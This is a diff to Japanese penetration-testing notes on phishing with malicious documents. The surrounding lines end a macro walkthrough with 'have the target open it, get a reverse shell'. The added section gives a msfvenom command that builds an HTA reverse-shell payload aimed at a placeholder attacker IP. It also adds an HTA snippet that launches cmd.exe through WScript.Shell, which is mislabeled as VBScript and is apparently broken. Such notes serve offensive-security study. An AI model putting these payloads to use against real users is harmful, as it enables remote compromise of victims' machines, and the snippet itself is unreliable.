@@ -230,3 +230,37 @@ End Sub
 - `Dim`：Dimention＝変数の宣言（英語の意味は”範囲”）
 
 6. マクロを保存後、マクロ編集画面を閉じる。ファイルを保存する。ターゲットに開かせる。→リバースシェル獲得！
+
+---
+
+# 補足
+
+## HTAペイロード
+
+- マクロの代わりに使えるペイロード
+
+msfvenom
+```zsh
+msfvenom -p windows/shell_reverse_tcp -f hta-psh -o shell.hta LPORT=443 LHOST=<attacker_IP>
+```
+
+コードスニペット
+```html
+<html>
+<head>
+<script language="VBScript">
+
+  <!-- just opens cmd terminal -->
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+
+</script>
+</head>
+<body>
+<script language="VBScript">
+<!-- close this HTA window now that script running -->
+self.close();
+</script>
+</body>
+</html>
+```
